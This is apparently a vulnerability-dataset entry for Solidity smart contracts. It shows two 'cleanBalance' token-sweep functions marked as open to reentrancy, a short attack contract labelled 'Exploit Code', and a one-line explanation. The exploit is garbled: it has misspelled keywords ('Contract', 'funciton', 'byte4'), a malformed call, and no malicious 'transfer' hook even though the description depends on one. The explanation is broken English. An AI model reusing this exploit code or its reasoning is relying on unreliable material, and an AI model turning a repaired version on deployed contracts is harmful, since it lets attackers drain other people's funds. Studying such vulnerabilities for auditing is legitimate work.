## Vulnerable Code

```javascript
**Instance_1**
function cleanBalance(address token) external returns(uint256 b) {
        if (uint(token)==0) {
            msg.sender.transfer(b = address(this).balance);
            emit Clean(token, msg.sender, b);
            return;
        }
        b = Yrc20(token).balanceOf(this);
        emit Clean(token, msg.sender, b);
        require(b>0, 'must have a balance');
        require(Yrc20(token).transfer(msg.sender,b), 'transfer failed'); //vulnerability position
}


**Instance_2**
function cleanBalance(address token) public returns(uint256 b) {
        b = Erc20(token).balanceOf(this);
        require(b>0, 'must have a balance');
        require(Erc20(token).transfer(msg.sender,b), 'transfer failed');
}
```



## Exploit Code

```javascript
contract Yrc20{

}
Contract Attack is Yrc20{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton forward() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(cleanBalance(address)”)), this);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position: IF the paramete of 'token' is transformed from a malicious address, the method of "transfer" can be a malicious function to reentrancy.

